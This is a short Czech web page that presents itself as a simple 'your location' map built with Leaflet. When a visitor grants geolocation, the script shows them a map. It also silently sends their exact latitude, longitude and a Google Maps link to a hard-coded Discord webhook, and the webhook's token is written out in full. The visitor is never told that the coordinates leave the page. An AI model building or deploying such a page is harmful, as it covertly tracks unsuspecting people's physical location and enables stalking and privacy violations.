<!DOCTYPE html>
<html lang="cs">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Moje Lokace</title>
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.3/dist/leaflet.css"/>
    <script src="https://unpkg.com/leaflet@1.9.3/dist/leaflet.js"></script>
    <style>
        #map { height: 400px; width: 100%; }
    </style>
</head>
<body>

<h2>Tvoje poloha</h2>
<div id="map"></div>

<script>
    function sendLocationToWebhook(latitude, longitude) {
        const webhookURL = "https://discord.com/api/webhooks/1336736765674917979/lyGotJhq7TWp2kRsHpd_246EPiXxMZ91S3rKDVuq54iFQX-FY8TlJ7pat1eBph-KL0XC";
        const data = {
            content: `📍 **Nová lokace:**\n🌍 Latitude: ${latitude}\n🌍 Longitude: ${longitude}\n🔗 [Zobrazit na mapě](https://www.google.com/maps?q=${latitude},${longitude})`
        };

        fetch(webhookURL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(data)
        })
        .then(response => console.log("Lokace odeslána:", response))
        .catch(error => console.error("Chyba při odesílání:", error));
    }

    function showLocation(position) {
        const latitude = position.coords.latitude;
        const longitude = position.coords.longitude;

        // Zobrazit mapu
        const map = L.map('map').setView([latitude, longitude], 15);
        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
            attribution: '&copy; OpenStreetMap contributors'
        }).addTo(map);

        L.marker([latitude, longitude]).addTo(map)
            .bindPopup("Tady jsi!")
            .openPopup();

        // Odeslat na webhook
        sendLocationToWebhook(latitude, longitude);
    }

    function errorHandler(error) {
        console.error("Chyba při získávání polohy:", error);
        alert("Nepodařilo se získat polohu.");
    }

    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(showLocation, errorHandler);
    } else {
        alert("Geolokace není podporována v tomto prohlížeči.");
    }
</script>

</body>
</html>
